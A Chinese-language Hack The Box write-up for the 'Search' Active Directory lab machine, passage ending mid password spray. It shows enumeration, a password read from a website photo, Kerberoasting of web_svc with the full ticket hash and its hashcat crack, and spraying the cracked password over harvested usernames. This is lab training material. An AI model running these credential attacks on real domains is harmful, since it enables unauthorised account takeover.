---
title: HTB-Search Writeup
date: 2026-08-14T14:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - HTB
  - Writeup
  - GetNPUsers
  - RPC
  - SMB
  - 密码喷射
  - gMSA
  - Wmiexec
---
## Nmap 端口扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search]
└─$ sudo nmap --min-rate 10000 -p- 10.129.229.57 -oA Nmap/ports
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-13 02:57 -0400
Nmap scan report for 10.129.229.57
Host is up (0.57s latency).
Not shown: 65521 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
9389/tcp  open  adws
49691/tcp open  unknown
49708/tcp open  unknown
49717/tcp open  unknown
49746/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 27.99 seconds
```

提取端口做备用。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search]
└─$ grep open Nmap/ports.nmap | awk -F '/' '{print $1}' | paste -sd ','
53,80,135,139,389,443,445,636,3268,9389,49691,49708,49717,49746

```

## Nmap 详细信息扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search]
└─$ sudo nmap -sT -sC -sV -O -p 53,80,135,139,389,443,445,636,3268,9389,49691,49708,49717,49746 10.129.229.57 -oA Nmap/tcp_scan          
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-13 02:59 -0400
Nmap scan report for 10.129.229.57
Host is up (0.19s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Search &mdash; Just Testing IIS
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-13T07:01:12+00:00; -31s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2026-08-13T07:01:12+00:00; -30s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_http-server-header: Microsoft-IIS/10.0
445/tcp   open  microsoft-ds?
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-13T07:01:12+00:00; -30s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-13T07:01:12+00:00; -31s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
9389/tcp  open  mc-nmf        .NET Message Framing
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49708/tcp open  msrpc         Microsoft Windows RPC
49717/tcp open  msrpc         Microsoft Windows RPC
49746/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (95%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (95%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-13T06:59:58
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: -30s, deviation: 0s, median: -30s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 143.05 seconds

```

这是一台 Windows 的机器，开放 Web 80 和 443 端口，同时开放 rpc 和 smb、ldap。

将暴露出的域名做解析。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search]
└─$ echo '10.129.229.57 search.htb research.search.htb research' | sudo tee -a /etc/hosts
10.129.229.57 search.htb research.search.htb research

```

## Web-80 渗透

访问 80 Web 服务，暴露出了很多人名。

![](Pasted%20image%2020260814165159.png)

将这些人名保存为一个字典，并对其进行扩展如下。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search]
└─$ vim Users/users.txt
                                                                                                                                                                        
┌──(kali㉿kali)-[~/Work/Kali/Search]
└─$ cat Users/users.txt
Bruce Rogers
John Smith
Christine Aguilar
Robert Spears
Keely Lyons
Dax Santiago
Sierra Frye
Kyla Stewart
Kaiara Spencer
Dave Simpson
Ben Thompson
Chris Stewart
keely.lyons
klyons
keely
lyons
dax.santiago
dsantiago
dax
sierra.frye
sfrye
kyla.stewart
kstewart
kaiara.spencer
kspencer
dave.simpson
dsimpson
ben.thompson
bthompson
chris.stewart
cstewart
bruce.rogers
brogers
brucer
brucerogers
rogersbruce
rogers.bruce
rogersb
b.rogers
bruce_r
bruce_rogers
bruce-rogers
rogers
bruce

john.smith
jsmith
johns
johnsmith
smithjohn
smith.john
smithj
j.smith
john_s
john_smith
john-smith
smith
john

christine.aguilar
caguilar
christinea
christineaguilar
aguilarchristine
aguilar.christine
aguilarc
c.aguilar
christine_a
christine_aguilar
christine-aguilar
aguilar
christine

robert.spears
rspears
roberts
robertspears
spearsrobert
spears.robert
spearsr
r.spears
robert_s
robert_spears
robert-spears
spears
robert

keely.lyons
klyons
keelyl
keelylyons
lyonskeely
lyons.keely
lyonsk
k.lyons
keely_l
keely_lyons
keely-lyons
lyons
keely

dax.santiago
dsantiago
daxs
daxsantiago
santiagodax
santiago.dax
santiagod
d.santiago
dax_s
dax_santiago
dax-santiago
santiago
dax

sierra.frye
sfrye
sierraf
sierrafrye
fryesierra
frye.sierra
fryes
s.frye
sierra_f
sierra_frye
sierra-frye
frye
sierra

kyla.stewart
kstewart
kylas
kylastewart
stewartkyla
stewart.kyla
stewartk
k.stewart
kyla_s
kyla_stewart
kyla-stewart
stewart
kyla

kaiara.spencer
kspencer
kaiaras
kaiaraspencer
spencerkaiara
spencer.kaiara
spencerk
k.spencer
kaiara_s
kaiara_spencer
kaiara-spencer
spencer
kaiara

dave.simpson
dsimpson
daves
davesimpson
simpsondave
simpson.dave
simpsond
d.simpson
dave_s
dave_simpson
dave-simpson
simpson
dave

ben.thompson
bthompson
bent
benthompson
thompsonben
thompson.ben
thompsonb
b.thompson
ben_t
ben_thompson
ben-thompson
thompson
ben

chris.stewart
cstewart
chriss
chrisstewart
stewartchris
stewart.chris
stewartc
c.stewart
chris_s
chris_stewart
chris-stewart
stewart
chris
                                        
```

使用这个字典尝试爆破出具有 no-pre 的账户，失败。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search]
└─$ impacket-GetNPUsers -no-pass -dc-ip 10.129.229.57 search.htb/ -usersfile Users/users.txt 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User keely.lyons doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos datab
...
...
```

匿名连接 rpc 看看有没有什么有价值的信息，没有发现。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search]
└─$ rpcclient -U '' -N 10.129.229.57
rpcclient $> srvinfo
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> enumdomusers
do_cmd: Could not initialise samr. Error was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> querydispinfo
do_cmd: Could not initialise samr. Error was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> getdompwinfo
do_cmd: Could not initialise samr. Error was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> lsaquery
do_cmd: Could not initialise lsarpc. Error was NT_STATUS_CONNECTION_DISCONNECTED

```

## SMB 探索

尝试匿名登录 SMB，没有暴露共享文件夹。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search]
└─$ smbclient -L 10.129.229.57 -N                                                                                              
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.229.57 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

尝试随机用户与空密码，仍然没有结果。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search]
└─$ nxc smb search.htb --shares -u enil -p ''                 
SMB         10.129.229.57   445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\enil: STATUS_LOGON_FAILURE 
```

继续浏览 Web 80 网站，发现一张可能有价值的照片，下载下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search/Picture]
└─$ wget http://search.htb/images/slide_2.jpg                                 
--2026-08-13 22:30:00--  http://search.htb/images/slide_2.jpg
Resolving search.htb (search.htb)... 10.129.229.57
Connecting to search.htb (search.htb)|10.129.229.57|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 162396 (159K) [image/jpeg]
Saving to: ‘slide_2.jpg’

slide_2.jpg                          100%[======================================================================>] 158.59K   473KB/s    in 0.3s    

2026-08-13 22:30:00 (473 KB/s) - ‘slide_2.jpg’ saved [162396/162396]
```

放大看可以看到 'Send password to Hope Sharp IsolationIsKey?'。

![](Pasted%20image%2020260814103047.png)

尝试这一组凭据 'hope.sharp IsolationIsKey?'，发现可以查找到 smb。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search/Picture]
└─$ nxc smb search.htb --shares -u hope.sharp -p 'IsolationIsKey?'
SMB         10.129.229.57   445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.57   445    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey? 
SMB         10.129.229.57   445    RESEARCH         [*] Enumerated shares
SMB         10.129.229.57   445    RESEARCH         Share           Permissions     Remark
SMB         10.129.229.57   445    RESEARCH         -----           -----------     ------
SMB         10.129.229.57   445    RESEARCH         ADMIN$                          Remote Admin
SMB         10.129.229.57   445    RESEARCH         C$                              Default share
SMB         10.129.229.57   445    RESEARCH         CertEnroll      READ            Active Directory Certificate Services share
SMB         10.129.229.57   445    RESEARCH         helpdesk                        
SMB         10.129.229.57   445    RESEARCH         IPC$            READ            Remote IPC
SMB         10.129.229.57   445    RESEARCH         NETLOGON        READ            Logon server share 
SMB         10.129.229.57   445    RESEARCH         RedirectedFolders$ READ,WRITE      
SMB         10.129.229.57   445    RESEARCH         SYSVOL          READ            Logon server share
```

查看这组凭据的权限。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search/Users]
└─$ nxc ldap search.htb -u hope.sharp -p 'IsolationIsKey?' 
LDAP        10.129.229.57   389    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 (name:RESEARCH) (domain:search.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.229.57   389    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey? 
┌──(kali㉿kali)-[~/Work/Kali/Search/Users]
└─$ nxc winrm search.htb -u hope.sharp -p 'IsolationIsKey?'
                          
```

将这组凭据保存下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search]
└─$ echo "hope.sharp:IsolationIsKey?" >> hope_sharp  
                                                                                                                                                    
┌──(kali㉿kali)-[~/Work/Kali/Search]
└─$ cat hope_sharp  
hope.sharp:IsolationIsKey?
```

用刚拿到的凭据，使用 smbclient 查看暴露出来的共享文件夹。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search]
└─$ smbclient \\\\10.129.229.57\\CertEnroll -U 'search.htb/hope.sharp%IsolationIsKey?' -c 'ls'
  .                                  Dc        0  Thu Aug 13 21:45:16 2026
  ..                                 Dc        0  Thu Aug 13 21:45:16 2026
  nsrev_search-RESEARCH-CA.asp       Ac      330  Tue Apr  7 03:29:31 2020
  Research.search.htb_search-RESEARCH-CA.crt     Ac      883  Tue Apr  7 03:29:29 2020
  search-RESEARCH-CA+.crl            Ac      735  Thu Aug 13 21:45:16 2026
  search-RESEARCH-CA.crl             Ac      931  Thu Aug 13 21:45:16 2026

                3246079 blocks of size 4096. 767480 blocks available

```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search]
└─$ smbclient \\\\10.129.229.57\\SYSVOL -U 'search.htb/hope.sharp%IsolationIsKey?' -c 'ls' 
  .                                  Dc        0  Tue Mar 31 11:41:30 2020
  ..                                 Dc        0  Tue Mar 31 11:41:30 2020
  FOLJWSHRGG                         Dc        0  Tue Mar 31 11:41:30 2020
  search.htb                        Drc        0  Tue Mar 31 10:18:24 2020

                3246079 blocks of size 4096. 767434 blocks available

```

RedirectedFolders$ 中的文件名很像人名。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search]
└─$ smbclient \\\\10.129.229.57\\RedirectedFolders$ -U 'search.htb/hope.sharp%IsolationIsKey?' -c 'ls'
  .                                  Dc        0  Thu Aug 13 22:31:44 2026
  ..                                 Dc        0  Thu Aug 13 22:31:44 2026
  abril.suarez                       Dc        0  Tue Apr  7 14:12:58 2020
  Angie.Duffy                        Dc        0  Fri Jul 31 09:11:32 2020
  Antony.Russo                       Dc        0  Fri Jul 31 08:35:32 2020
  belen.compton                      Dc        0  Tue Apr  7 14:32:31 2020
  Cameron.Melendez                   Dc        0  Fri Jul 31 08:37:36 2020
  chanel.bell                        Dc        0  Tue Apr  7 14:15:09 2020
  Claudia.Pugh                       Dc        0  Fri Jul 31 09:09:08 2020
  Cortez.Hickman                     Dc        0  Fri Jul 31 08:02:04 2020
  dax.santiago                       Dc        0  Tue Apr  7 14:20:08 2020
  Eddie.Stevens                      Dc        0  Fri Jul 31 07:55:34 2020
  edgar.jacobs                       Dc        0  Thu Apr  9 16:04:11 2020
  Edith.Walls                        Dc        0  Fri Jul 31 08:39:50 2020
  eve.galvan                         Dc        0  Tue Apr  7 14:23:13 2020
  frederick.cuevas                   Dc        0  Tue Apr  7 14:29:22 2020
  hope.sharp                         Dc        0  Thu Apr  9 10:34:41 2020
  jayla.roberts                      Dc        0  Tue Apr  7 14:07:00 2020
  Jordan.Gregory                     Dc        0  Fri Jul 31 09:01:06 2020
  payton.harmon                      Dc        0  Thu Apr  9 16:11:39 2020
  Reginald.Morton                    Dc        0  Fri Jul 31 07:44:32 2020
  santino.benjamin                   Dc        0  Tue Apr  7 14:10:25 2020
  Savanah.Velazquez                  Dc        0  Fri Jul 31 08:21:42 2020
  sierra.frye                        Dc        0  Wed Nov 17 20:01:46 2021
  trace.ryan                         Dc        0  Thu Apr  9 16:14:26 2020

                3246079 blocks of size 4096. 767434 blocks available

```

进入 hope.sharp 的目录看看有没有有价值的信息，没有发现。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search]
└─$ smbclient \\\\10.129.229.57\\RedirectedFolders$ -U 'search.htb/hope.sharp%IsolationIsKey?' -c 'cd hope.sharp;recurse ON prompt OFF;ls'
  .                                  Dc        0  Thu Apr  9 10:34:41 2020
  ..                                 Dc        0  Thu Apr  9 10:34:41 2020
  Desktop                           DRc        0  Thu Apr  9 10:35:49 2020
  Documents                         DRc        0  Thu Apr  9 10:35:50 2020
  Downloads                         DRc        0  Thu Apr  9 10:35:49 2020

\hope.sharp\Desktop
  .                                 DRc        0  Thu Apr  9 10:35:49 2020
  ..                                DRc        0  Thu Apr  9 10:35:49 2020
  $RECYCLE.BIN                     DHSc        0  Thu Apr  9 10:35:49 2020
  desktop.ini                      AHSc      282  Thu Apr  9 10:35:00 2020
  Microsoft Edge.lnk                 Ac     1450  Thu Apr  9 10:35:38 2020

\hope.sharp\Documents
  .                                 DRc        0  Thu Apr  9 10:35:50 2020
  ..                                DRc        0  Thu Apr  9 10:35:50 2020
  $RECYCLE.BIN                     DHSc        0  Thu Apr  9 10:35:51 2020
  desktop.ini                      AHSc      402  Thu Apr  9 10:35:03 2020

\hope.sharp\Downloads
  .                                 DRc        0  Thu Apr  9 10:35:49 2020
  ..                                DRc        0  Thu Apr  9 10:35:49 2020
  $RECYCLE.BIN                     DHSc        0  Thu Apr  9 10:35:49 2020
  desktop.ini                      AHSc      282  Thu Apr  9 10:35:02 2020

\hope.sharp\Desktop\$RECYCLE.BIN
  .                                DHSc        0  Thu Apr  9 10:35:49 2020
  ..                               DHSc        0  Thu Apr  9 10:35:49 2020
  desktop.ini                      AHSc      129  Thu Apr  9 10:35:49 2020

\hope.sharp\Documents\$RECYCLE.BIN
  .                                DHSc        0  Thu Apr  9 10:35:51 2020
  ..                               DHSc        0  Thu Apr  9 10:35:51 2020
  desktop.ini                      AHSc      129  Thu Apr  9 10:35:51 2020

\hope.sharp\Downloads\$RECYCLE.BIN
  .                                DHSc        0  Thu Apr  9 10:35:49 2020
  ..                               DHSc        0  Thu Apr  9 10:35:49 2020
  desktop.ini                      AHSc      129  Thu Apr  9 10:35:50 2020

                3246079 blocks of size 4096. 769371 blocks available

```

将文件夹名保存为一个新的用户字典。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search/Users]
└─$ cat users1.txt   
abril.suarez                       
Angie.Duffy                        
Antony.Russo                       
belen.compton                      
Cameron.Melendez                   
chanel.bell                        
Claudia.Pugh                       
Cortez.Hickman                     
dax.santiago                       
Eddie.Stevens                      
edgar.jacobs                       
Edith.Walls                        
eve.galvan                         
frederick.cuevas                   
hope.sharp                         
jayla.roberts                      
Jordan.Gregory                     
payton.harmon                      
Reginald.Morton                    
santino.benjamin                   
Savanah.Velazquez                  
sierra.frye                        
trace.ryan
```

使用 GetUserSPNs 查询到了 web_src 的 hash。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search/Users]
└─$ impacket-GetUserSPNs search.htb/hope.sharp:'IsolationIsKey?' -dc-ip 10.129.229.57 -request
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
---------------------------------  -------  --------  --------------------------  ---------  ----------
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 08:59:11.329031  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$f64bd99bd269ff1cf867dbc9a93ae201$e1b9519d8539796d2962729cb1f6b0919e1ba371244178bcd049a835f3b7ed8759117f00109c8f018ee3e9cae816f8f727f948296b490af46dbdb8bb6d9591650c753716159fbfaf52d3c81630f5d9faaf4f11280c54035acba7f799df3e0579f3e0b22ab9e2f4b5c362fb665f659dd17b82a0dc96965570849d204fabee854e8bc2f8c92a3d3abdbeb017b4b7d0be75ba6bdb8cdd9b73467f00fba2a8e2f88602e654b128b07ec3ac2d38d4e362b4554d1d54002e96d4c66478379c100b6ccacbcbdb73d789fccea735982cb2bcb4774f14af381f6908f305034a93f7bb74591bddf461d5f3ebe0f418747179be0dfd7c59c7c2c22c41eea871c9ec2a3429fb69c1c5ba296c5d4b34cf1b31dab99423f49ecd6fe206825d57d5a90f8d5b287cdb3312eb7b282ba0c6666a59e74f8cf195bb12a68853fd5b02fd2baff0ac09b0c67255d2eeb10740a5ee058627a3e908ef7e4742301c9fa449ff5e7cc0611d3fc0b687f817153820e109ee69ef63655e06fbc58fe50c6abc9045248b3c4f9ee3fa62579f1630ea2853e69c51635a410bc12e23d9ee0705c10df3304f81eb016876191c6c35311588f435c0ea48832c27a0cfcfb6058b4601638e5af2ce8cdf404b7cd38f0b5ba148f4b909a031f420dbec6e8ac858dca56ff2351d8c693133df25a4ca7179954fbb94175e61b1d46f9108a5647be8511ae0180fdd47c005cca10a7f2b70755d7a4025d57f1d8e79d5a2f8008d57ee845130be50e14815c9c776eab1cc6242e5dcdcdb7b72f76b297befd97a62832cb11d24380cff5a6710b6dfd0e1fd98fdb0ec7dc7edf84f9d08f19fdc356edf77abff05b7fd4d529dc1e0b43511f7dd2857dc76c3acb89b32bfe4cc84643091271ffa107a48b53f8fc55b56937c75522dabfb2a6db685b0952b266b1a7334a32f33eb5815753204d430c2b9cf457f17df42510084ad5aa22964b381fbc5fdd266ec408e77da78c7917234f795ea11bb8bf8647bac67643c15a4f7f88acb77519b8b93e5b8809f6397e5dc4a548c1dcaaf3cc3d9874cdcd5caaa019b5568d65aae5d05cef7ba9d17b1559636c3f9eb10acd3829ecaf79e62c4147ac1593535203f9e1616b0fc5a54c0b0808724c5ec15eafa6d7e0098a8d09cd8a9c0fae2fba53dd9d1805981ab67a47eeb6b4edcc6673e6dcec40fe04b18fb03e7e87605d7b0b9bbb8c972894f840ca063ed6c633fc76c1bd634d5f44bc086a6d61124d9bb9100f92865e4bb819da7e0b7b2bf377c31aa0d88d903428fbf3d3f4b6ae90e5d102a0b3f5adafeb39f293376383472f50f0efbca9f0394be1f6d6e74ba9bd9af52f0514d19c08256221c868ae882d26e17a1d69602385b019b86121a027b05d7433054b3cdd2373d12423bd5163a996d8c23919078c5e67519be20c624b18d15032bcb596e0907b1d4c90aacb244d84cd473f487406803a13f4aa1be7e2c4aa8b9c6

```

使用 hashcat 爆破出凭据为 @3ONEmillionbaby。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search/Users]
└─$ sudo hashcat -m 13100 sharp.hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900HX, 13929/27859 MB (4096 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (27049 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$f64bd99bd269ff1cf867dbc9a93ae201$e1b9519d8539796d2962729cb1f6b0919e1ba371244178bcd049a835f3b7ed8759117f00109c8f018ee3e9cae816f8f727f948296b490af46dbdb8bb6d9591650c753716159fbfaf52d3c81630f5d9faaf4f11280c54035acba7f799df3e0579f3e0b22ab9e2f4b5c362fb665f659dd17b82a0dc96965570849d204fabee854e8bc2f8c92a3d3abdbeb017b4b7d0be75ba6bdb8cdd9b73467f00fba2a8e2f88602e654b128b07ec3ac2d38d4e362b4554d1d54002e96d4c66478379c100b6ccacbcbdb73d789fccea735982cb2bcb4774f14af381f6908f305034a93f7bb74591bddf461d5f3ebe0f418747179be0dfd7c59c7c2c22c41eea871c9ec2a3429fb69c1c5ba296c5d4b34cf1b31dab99423f49ecd6fe206825d57d5a90f8d5b287cdb3312eb7b282ba0c6666a59e74f8cf195bb12a68853fd5b02fd2baff0ac09b0c67255d2eeb10740a5ee058627a3e908ef7e4742301c9fa449ff5e7cc0611d3fc0b687f817153820e109ee69ef63655e06fbc58fe50c6abc9045248b3c4f9ee3fa62579f1630ea2853e69c51635a410bc12e23d9ee0705c10df3304f81eb016876191c6c35311588f435c0ea48832c27a0cfcfb6058b4601638e5af2ce8cdf404b7cd38f0b5ba148f4b909a031f420dbec6e8ac858dca56ff2351d8c693133df25a4ca7179954fbb94175e61b1d46f9108a5647be8511ae0180fdd47c005cca10a7f2b70755d7a4025d57f1d8e79d5a2f8008d57ee845130be50e14815c9c776eab1cc6242e5dcdcdb7b72f76b297befd97a62832cb11d24380cff5a6710b6dfd0e1fd98fdb0ec7dc7edf84f9d08f19fdc356edf77abff05b7fd4d529dc1e0b43511f7dd2857dc76c3acb89b32bfe4cc84643091271ffa107a48b53f8fc55b56937c75522dabfb2a6db685b0952b266b1a7334a32f33eb5815753204d430c2b9cf457f17df42510084ad5aa22964b381fbc5fdd266ec408e77da78c7917234f795ea11bb8bf8647bac67643c15a4f7f88acb77519b8b93e5b8809f6397e5dc4a548c1dcaaf3cc3d9874cdcd5caaa019b5568d65aae5d05cef7ba9d17b1559636c3f9eb10acd3829ecaf79e62c4147ac1593535203f9e1616b0fc5a54c0b0808724c5ec15eafa6d7e0098a8d09cd8a9c0fae2fba53dd9d1805981ab67a47eeb6b4edcc6673e6dcec40fe04b18fb03e7e87605d7b0b9bbb8c972894f840ca063ed6c633fc76c1bd634d5f44bc086a6d61124d9bb9100f92865e4bb819da7e0b7b2bf377c31aa0d88d903428fbf3d3f4b6ae90e5d102a0b3f5adafeb39f293376383472f50f0efbca9f0394be1f6d6e74ba9bd9af52f0514d19c08256221c868ae882d26e17a1d69602385b019b86121a027b05d7433054b3cdd2373d12423bd5163a996d8c23919078c5e67519be20c624b18d15032bcb596e0907b1d4c90aacb244d84cd473f487406803a13f4aa1be7e2c4aa8b9c6:@3ONEmillionbaby
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*...a8b9c6
Time.Started.....: Thu Aug 13 23:01:18 2026 (4 secs)
Time.Estimated...: Thu Aug 13 23:01:22 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  3067.5 kH/s (1.75ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 11493376/14344385 (80.12%)
Rejected.........: 0/11493376 (0.00%)
Restore.Point....: 11485184/14344385 (80.07%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: @m0rX1oopre*** -> <div><embed src="http://apps.rockyou.com/fxtext.swf?ID=32898760&nopanel=true&stage=true" quality="high"  scale="noscale" width="282.72" height="110.00625" wmode="transparent" name="rockyou" type="application/x-shockwave-flash" pluginspage="http://www.macr
Hardware.Mon.#01.: Util: 58%

Started: Thu Aug 13 23:01:06 2026
Stopped: Thu Aug 13 23:01:22 2026

```

## 密码喷射

web_svc 像是一个系统服务，看看有没有密码复用。

发现 Eddie.Stevens 的密码也是 @3ONEmillionbaby。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search/Users]
└─$ nxc smb search.htb -u users1.txt -p '@3ONEmillionbaby' --continue-on-success 
SMB         10.129.229.57   445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\abril.suarez:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Angie.Duffy:@3ONEmillionbaby STATUS_LOGON_FAILURE 
